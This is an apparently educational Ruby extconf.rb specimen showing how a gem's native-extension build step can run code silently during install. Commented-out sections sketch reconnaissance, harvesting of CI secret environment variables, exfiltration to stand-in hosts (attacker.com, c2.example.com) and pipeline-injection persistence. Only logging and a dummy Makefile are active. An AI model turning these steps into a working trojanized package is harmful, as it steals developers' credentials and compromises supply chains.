# frozen_string_literal: true

# =============================================================================
# RubyGuardian - Trojanized Gem Specimen: extconf.rb (Build-Time Execution)
# =============================================================================
#
# EDUCATIONAL DISCLAIMER:
#   This file demonstrates how native extension configuration (extconf.rb)
#   can be weaponized for code execution during `gem install`. When a gem
#   declares `spec.extensions = ['ext/extconf.rb']` in its gemspec,
#   RubyGems executes this file with the installing user's full privileges.
#
#   ALL MALICIOUS FUNCTIONALITY IS COMMENTED OUT. Only educational logging
#   and the standard mkmf dummy Makefile generation are active.
#
# MITRE ATT&CK References:
#   - T1195.002 : Supply Chain Compromise: Compromise Software Supply Chain
#   - T1059.004 : Command and Scripting Interpreter: Unix Shell
#   - T1546.016 : Event Triggered Execution: Installer Packages
#   - T1082     : System Information Discovery
#   - T1041     : Exfiltration Over C2 Channel
#
# How This Attack Works:
#   1. Developer runs: gem install config_helper  (or bundle install)
#   2. RubyGems downloads and unpacks the gem
#   3. RubyGems sees `extensions` in the gemspec
#   4. RubyGems executes this file (ext/extconf.rb) using the system Ruby
#   5. This file runs with the user's full privileges
#   6. In a real attack, this is where secrets are stolen and payloads run
#   7. The file creates a dummy Makefile so `gem install` succeeds
#
# Key Insight:
#   extconf.rb execution is SILENT - users see no warning or prompt.
#   The gem appears to install normally. This is why supply chain attacks
#   through native extensions are particularly dangerous.
# =============================================================================

require 'mkmf'
require 'rbconfig'

# =============================================================================
# Research logging - the only active functionality
# =============================================================================
RESEARCH_LOG_PATH = File.expand_path('../install_research.log', __dir__)

def log_research(message)
  timestamp = Time.now.strftime('%Y-%m-%d %H:%M:%S')
  entry = "[#{timestamp}] [EXTCONF-RESEARCH] #{message}\n"
  File.open(RESEARCH_LOG_PATH, 'a') { |f| f.write(entry) }
rescue StandardError
  nil
end

log_research('extconf.rb executed - demonstrating build-time code execution')
log_research("Ruby version: #{RUBY_VERSION}")
log_research("Platform: #{RUBY_PLATFORM}")
log_research("User: #{ENV['USER'] || 'unknown'}")
log_research("Working directory: #{Dir.pwd}")

# =============================================================================
# DISABLED: System Reconnaissance (T1082 - System Information Discovery)
# =============================================================================
# A real trojanized extconf.rb would first gather information about the
# host system to determine if it's a valuable target (CI runner, prod server).
#
# # Collect system information for targeting decisions
# system_info = {
#   hostname: Socket.gethostname,
#   username: ENV['USER'] || ENV['USERNAME'],
#   home_dir: ENV['HOME'] || ENV['USERPROFILE'],
#   ruby_version: RUBY_VERSION,
#   platform: RUBY_PLATFORM,
#   pid: Process.pid,
#   uid: Process.uid,
#   cwd: Dir.pwd,
#   env_count: ENV.size,
#   ci_detected: !!(ENV['CI'] || ENV['GITHUB_ACTIONS'] || ENV['GITLAB_CI'])
# }

log_research('DISABLED: System reconnaissance would run here')

# =============================================================================
# DISABLED: CI/CD Environment Detection and Secret Harvesting
# =============================================================================
# The primary goal of CI/CD poisoning is to steal secrets available in the
# build environment. CI runners typically have access to:
#   - Cloud provider credentials (AWS, GCP, Azure)
#   - Container registry tokens
#   - Package publishing tokens (npm, RubyGems, PyPI)
#   - SSH keys for deployment
#   - API keys for various services
#   - Database credentials
#
# # Detect CI environment
# ci_platform = nil
# if ENV['GITHUB_ACTIONS']
#   ci_platform = 'github_actions'
#   # GitHub Actions secrets are in GITHUB_TOKEN and custom secrets
#   # Also: ACTIONS_RUNTIME_TOKEN, ACTIONS_CACHE_URL
# elsif ENV['GITLAB_CI']
#   ci_platform = 'gitlab_ci'
#   # GitLab CI has CI_JOB_TOKEN with API access
#   # Also: CI_REGISTRY_PASSWORD, KUBECONFIG
# elsif ENV['JENKINS_URL']
#   ci_platform = 'jenkins'
#   # Jenkins credentials are accessible via credentials API
# end
#
# # Harvest secrets from environment
# secret_patterns = /TOKEN|SECRET|KEY|PASSWORD|CRED|API|AUTH|PRIVATE|DEPLOY/i
# harvested = ENV.select { |k, _| k.match?(secret_patterns) }

log_research('DISABLED: CI/CD detection and secret harvesting would run here')

# =============================================================================
# DISABLED: Exfiltration to C2 Server (T1041)
# =============================================================================
# Stolen data would be sent to the C2 server during the build process.
# Common exfiltration techniques include:
#
# # DNS exfiltration (bypasses most firewalls)
# # require 'resolv'
# # encoded = Base64.strict_encode64(data)[0..60]
# # Resolv::DNS.new.getresource("#{encoded}.data.attacker.com", Resolv::DNS::Resource::IN::A)
#
# # HTTPS POST (blends with normal traffic)
# # require 'net/http'
# # uri = URI('https://c2.example.com/exfil')
# # Net::HTTP.post(uri, payload, 'Content-Type' => 'application/json')
#
# # Webhook abuse (uses legitimate services as proxies)
# # Net::HTTP.post(URI('https://hooks.slack.com/...'), payload)

log_research('DISABLED: Data exfiltration would occur here')

# =============================================================================
# DISABLED: Pipeline Injection (T1195.002)
# =============================================================================
# After stealing secrets, the attacker may also inject code into the CI
# pipeline itself to maintain persistence across future builds.
#
# # Modify GitHub Actions workflow files
# # Dir.glob('.github/workflows/*.yml').each do |wf|
# #   inject_exfil_step(wf)
# # end
#
# # Add malicious npm scripts
# # if File.exist?('package.json')
# #   pkg = JSON.parse(File.read('package.json'))
# #   pkg['scripts']['postinstall'] = malicious_command
# #   File.write('package.json', JSON.pretty_generate(pkg))
# # end
#
# # Create or modify Makefile targets
# # File.open('Makefile', 'a') { |f| f.puts(malicious_make_target) }

log_research('DISABLED: Pipeline injection would occur here')

# =============================================================================
# Active Code: Generate dummy Makefile (required for gem install to succeed)
# =============================================================================
# This is the only part that actually runs. It creates a no-op Makefile
# so that `gem install` completes successfully. Without this, the gem
# installation would fail, alerting the developer.
#
# In a real attack, this line is critical: it makes the malicious
# extconf.rb appear to be a normal native extension build step.

log_research('Generating dummy Makefile for clean gem installation')

# Create a Makefile that does nothing (no actual native extension to compile)
File.open('Makefile', 'w') do |f|
  f.puts '# Auto-generated dummy Makefile for config_helper gem'
  f.puts '# This gem has no actual native extensions to compile.'
  f.puts '# The extconf.rb exists for research demonstration purposes.'
  f.puts ''
  f.puts 'all:'
  f.puts "\t@echo 'config_helper: no native extensions to build'"
  f.puts ''
  f.puts 'install:'
  f.puts "\t@echo 'config_helper: nothing to install'"
  f.puts ''
  f.puts 'clean:'
  f.puts "\t@echo 'config_helper: nothing to clean'"
end

log_research('extconf.rb completed successfully - gem install will proceed')
log_research('=' * 60)
log_research('SUMMARY: In a real attack, the following would have occurred:')
log_research('  1. System reconnaissance (hostname, user, platform)')
log_research('  2. CI/CD environment detection')
log_research('  3. Secret harvesting from environment variables')
log_research('  4. Data exfiltration to C2 server')
log_research('  5. Pipeline configuration injection for persistence')
log_research('  ALL OF THE ABOVE WAS DISABLED (research specimen only)')
log_research('=' * 60)
